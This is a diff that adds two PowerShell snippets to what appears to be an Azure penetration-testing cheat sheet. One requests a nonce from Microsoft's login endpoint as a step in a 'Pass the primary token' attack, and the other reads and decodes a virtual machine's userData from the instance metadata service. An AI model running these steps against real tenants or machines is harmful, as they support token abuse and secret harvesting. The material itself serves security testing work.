@@ -69,3 +69,25 @@ $RequestParams = @{
 (Invoke-RestMethod @RequestParams).value
 ```
 
+### Get nonce for Pass the primary token
+```
+$TenantId = "<id>"
+$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+
+$Params = @{
+    "URI" = $URL
+    "Method" = "POST"
+}
+
+$Body = @{
+    "grant_type" = "srv_challenge"
+}
+
+$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+```
+
+### Retrieve user data of virtual machine
+```
+$UserData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://<rhost>/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($UserData))
+```
